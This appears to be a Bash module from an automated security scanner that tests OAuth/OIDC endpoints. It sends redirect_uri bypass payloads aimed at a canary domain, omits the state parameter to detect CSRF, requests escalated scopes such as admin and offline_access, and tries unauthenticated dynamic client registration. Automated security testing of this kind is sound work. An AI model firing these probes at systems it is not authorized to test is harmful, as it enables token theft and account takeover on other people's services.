#!/usr/bin/env bash
# ============================================================
#  modules/49_oauth_deep.sh — Tier 3.3 OAuth/OIDC deep flows
#
#  Vectores:
#    1. redirect_uri parsing diff (//evil, %09evil, evil#legit, ?legit@evil)
#    2. state CSRF (omitir state, server emite code igual)
#    3. response_type confusion (token vs code, mixto)
#    4. scope escalation (añadir openid+admin+offline_access)
#    5. dynamic client registration abierto (POST /register)
# ============================================================

MODULE_NAME="oauth_deep"
MODULE_DESC="OAuth/OIDC — redirect_uri bypass, state CSRF, scope escalation"

_oauth_finding() {
  db_add_finding "$1" "oauth_deep" "$5" "$3" "$4" "$6" "${7:-medium}" 2>/dev/null
  log_warn "  ⚡ [$5/${7:-medium}] OAuth $4: $3"
  if [[ "${7:-medium}" != "low" ]] && [[ "$5" == "critical" || "$5" == "high" ]]; then
    _telegram_send "🔴 *OAuth — $4*
🌐 \`$2\`
🔗 \`$3\`
📋 ${6:0:280}
📊 \`${5^^}\` / \`${7:-medium}\`" 2>/dev/null || true
  fi
}

# Test redirect_uri bypass
# Anti-FP fix 2026-05-10: parsear HOST del Location y comparar exact match con
# canary domain. Workday-style canonicalization (301 con query reflejada) ya no
# triggerea FP porque LOC_HOST será el target, no el canary.
# Opt-in OOB: si OAUTH_CANARY_LOG_PATH apunta a access log accesible (default
# /var/log/nginx/access.log), buscar canary_id tras 3s para confirmation real.
_oauth_redirect_bypass() {
  local AUTH_URL="$1" CLIENT_ID="$2" DOMAIN_ID="$3" DOMAIN="$4"
  local CANARY_DOM="${OAUTH_CANARY_DOMAIN:-a.fernandes.es}"
  local CANARY_LOG="${OAUTH_CANARY_LOG_PATH:-/var/log/nginx/access.log}"
  local CANARY_ID="oauth-redir-$(date +%s)-$(openssl rand -hex 4)"
  local CANARY_URL="https://${CANARY_DOM}/${CANARY_ID}"

  # Parsing-diff payloads usando canary controlado
  local PAYLOADS=(
    "${CANARY_URL}"
    "https://victim@${CANARY_DOM}/${CANARY_ID}-userinfo"
    "//${CANARY_DOM}/${CANARY_ID}-protocol"
    "https://${CANARY_DOM}#${DOMAIN}/${CANARY_ID}-frag"
    "https://www.${DOMAIN}@${CANARY_DOM}/${CANARY_ID}-creds"
  )

  for PAYLOAD in "${PAYLOADS[@]}"; do
    local PAYLOAD_ENC
    PAYLOAD_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))" 2>/dev/null)
    local TEST_URL="${AUTH_URL}?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${PAYLOAD_ENC}&state=hackeadora&scope=openid"
    _h_get_noredirect "$TEST_URL" --connect-timeout 8
    local STATUS="$HTTP_LAST_STATUS"
    local LOC; LOC=$(echo "$HTTP_LAST_HEADERS" | grep -i '^location:' | head -1 | tr -d '\r' | sed 's/^[Ll]ocation:[[:space:]]*//')
    [[ -z "$LOC" ]] && continue

    # Parsear HOST del Location (no substring match — descarta canonicalization FPs)
    local LOC_HOST
    LOC_HOST=$(python3 -c "
import urllib.parse, sys
try: print(urllib.parse.urlparse('$LOC').netloc.lower().split(':')[0])
except: print('')
" 2>/dev/null)
    [[ -z "$LOC_HOST" ]] && continue

    # Bypass real: Location.host coincide exactly o es subdominio del canary
    if [[ "$LOC_HOST" == "$CANARY_DOM" ]] || [[ "$LOC_HOST" == *.${CANARY_DOM} ]]; then
      _oauth_finding "$DOMAIN_ID" "$DOMAIN" "$AUTH_URL" "redirect_uri_bypass" "critical" \
        "OAuth redirect_uri bypass: server emite redirect server-side a host '${LOC_HOST}' (canary). Payload: '$PAYLOAD'. Location: ${LOC:0:200}" \
        "high"
      return 0
    fi
  done

  # OOB confirmation: tras todos los probes, esperar y buscar canary_id en access log
  if [[ -r "$CANARY_LOG" ]]; then
    sleep 3
    if grep -qF "$CANARY_ID" "$CANARY_LOG" 2>/dev/null; then
      local LOG_LINE; LOG_LINE=$(grep -F "$CANARY_ID" "$CANARY_LOG" | head -1)
      _oauth_finding "$DOMAIN_ID" "$DOMAIN" "$AUTH_URL" "redirect_uri_bypass_oob_confirmed" "critical" \
        "OAuth redirect_uri bypass CONFIRMADO via OOB: server siguió redirect a ${CANARY_DOM} y la request llegó a nuestro logger. Log line: ${LOG_LINE:0:200}" \
        "high"
      return 0
    fi
  fi
  return 1
}

# Test state CSRF (omitir state)
_oauth_state_csrf() {
  local AUTH_URL="$1" CLIENT_ID="$2" DOMAIN_ID="$3" DOMAIN="$4"
  local TEST_URL="${AUTH_URL}?client_id=${CLIENT_ID}&response_type=code&redirect_uri=https%3A%2F%2F${DOMAIN}%2Fcallback&scope=openid"
  _h_get_noredirect "$TEST_URL" --connect-timeout 8
  local STATUS="$HTTP_LAST_STATUS"
  local LOC; LOC=$(echo "$HTTP_LAST_HEADERS" | grep -i '^location:' | head -1)
  # Si redirige a login (con o sin error) sin exigir state → state no required
  if [[ "$STATUS" =~ ^30[0-9]$ ]] && echo "$LOC" | grep -qiE 'login|signin|chooseschema'; then
    if ! echo "$LOC" | grep -qiE 'state.*required|missing.*state|error=invalid_request'; then
      _oauth_finding "$DOMAIN_ID" "$DOMAIN" "$AUTH_URL" "state_csrf" "medium" \
        "OAuth state CSRF: /authorize acepta requests sin parámetro state — RFC 6749 §10.12. Atacante puede CSRF login flow." \
        "medium"
      return 0
    fi
  fi
  return 1
}

# Test scope escalation
_oauth_scope_escalation() {
  local AUTH_URL="$1" CLIENT_ID="$2" DOMAIN_ID="$3" DOMAIN="$4"
  local SUSPICIOUS_SCOPES="openid admin offline_access write delete profile email"
  local SCOPE_ENC
  SCOPE_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$SUSPICIOUS_SCOPES'))" 2>/dev/null)
  local TEST_URL="${AUTH_URL}?client_id=${CLIENT_ID}&response_type=code&redirect_uri=https%3A%2F%2F${DOMAIN}%2Fcallback&state=hackeadora&scope=${SCOPE_ENC}"
  _h_get_noredirect "$TEST_URL" --connect-timeout 8
  local STATUS="$HTTP_LAST_STATUS"
  local LOC; LOC=$(echo "$HTTP_LAST_HEADERS" | grep -i '^location:' | head -1 | tr -d '\r')
  # Si redirige sin error → scopes aceptados sin validación
  if [[ "$STATUS" =~ ^30[0-9]$ ]] && ! echo "$LOC" | grep -qiE 'invalid_scope|unauthorized_scope|consent'; then
    if echo "$LOC" | grep -qiE 'login|signin'; then
      _oauth_finding "$DOMAIN_ID" "$DOMAIN" "$AUTH_URL" "scope_no_validation" "medium" \
        "OAuth scope no validado pre-login: server acepta 'admin offline_access write delete' como scopes válidos sin error. Verificar consent screen post-login." \
        "medium"
      return 0
    fi
  fi
  return 1
}

# Test dynamic client registration
_oauth_dynamic_registration() {
  local AUTH_URL="$1" DOMAIN_ID="$2" DOMAIN="$3"
  local BASE
  BASE=$(echo "$AUTH_URL" | grep -oP 'https?://[^/]+')

  for REG_PATH in "/register" "/oauth/register" "/oauth2/register" "/oidc/register" "/.well-known/openid-configuration"; do
    local URL="${BASE}${REG_PATH}"
    if [[ "$REG_PATH" == "/.well-known/openid-configuration" ]]; then
      _h_get_noredirect "$URL" --connect-timeout 5
      local STATUS="$HTTP_LAST_STATUS" BODY="${HTTP_LAST_BODY:0:5000}"
      [[ "$STATUS" != "200" ]] && continue
      # Buscar registration_endpoint
      local REG_EP; REG_EP=$(echo "$BODY" | python3 -c "
import json, sys
try: print(json.load(sys.stdin).get('registration_endpoint',''))
except: print('')
" 2>/dev/null)
      [[ -z "$REG_EP" ]] && continue
      URL="$REG_EP"
    fi
    # Probar POST con minimal client metadata
    local PAYLOAD='{"client_name":"hackeadora_test","redirect_uris":["https://hackeadora-test.invalid/callback"],"grant_types":["authorization_code"]}'
    _h_post_noredirect "$URL" "$PAYLOAD" --connect-timeout 8 \
      -H "Content-Type: application/json"
    local STATUS="$HTTP_LAST_STATUS" BODY="${HTTP_LAST_BODY:0:2000}"
    if [[ "$STATUS" =~ ^(200|201)$ ]] && echo "$BODY" | grep -qE '"client_id":|"client_secret":'; then
      local NEW_CLIENT; NEW_CLIENT=$(echo "$BODY" | grep -oE '"client_id":\s*"[^"]+"' | head -1)
      _oauth_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "dynamic_client_registration_open" "high" \
        "Dynamic client registration ABIERTO sin auth — atacante puede registrar OAuth clients. Response: $NEW_CLIENT" \
        "high"
      return 0
    fi
  done
  return 1
}

module_run() {
  local DOMAIN="$1" DOMAIN_ID="$2" OUT_DIR="$3"
  log_phase "Módulo 49 — $MODULE_DESC: $DOMAIN"
  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null
  source "${SCRIPT_DIR}/core/finding_validators.sh" 2>/dev/null

  # Authorize endpoints
  local AUTH_URLS
  AUTH_URLS=$(sqlite3 "$DB_PATH" "
    SELECT DISTINCT url FROM urls
    WHERE domain_id=${DOMAIN_ID}
      AND (url LIKE '%/authorize%' OR url LIKE '%/oauth/auth%' OR url LIKE '%/oauth2/auth%'
           OR url LIKE '%/connect/authorize%' OR url LIKE '%/openid-connect/auth%'
           OR url LIKE '%/as/authorize%')
    LIMIT 10;" 2>/dev/null | sort -u)
  [[ -z "$AUTH_URLS" ]] && { log_info "  Sin endpoints OAuth /authorize candidatos"; return 0; }

  local TOTAL=0
  while IFS= read -r AUTH_URL; do
    [[ -z "$AUTH_URL" ]] && continue
    AUTH_URL="${AUTH_URL%%\?*}"
    local CLIENT_ID
    CLIENT_ID=$(sqlite3 "$DB_PATH" "SELECT url FROM urls WHERE url LIKE '%client_id=%' AND domain_id=${DOMAIN_ID} LIMIT 1;" 2>/dev/null | grep -oP '(?<=client_id=)[^&]+' | head -1)
    [[ -z "$CLIENT_ID" ]] && CLIENT_ID="hackeadora_test_client"
    log_info "  → $AUTH_URL (client_id=$CLIENT_ID)"
    _oauth_redirect_bypass "$AUTH_URL" "$CLIENT_ID" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL++))
    _oauth_state_csrf "$AUTH_URL" "$CLIENT_ID" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL++))
    _oauth_scope_escalation "$AUTH_URL" "$CLIENT_ID" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL++))
    _oauth_dynamic_registration "$AUTH_URL" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL++))
  done <<< "$AUTH_URLS"
  log_ok "$MODULE_DESC: $TOTAL findings OAuth"
}
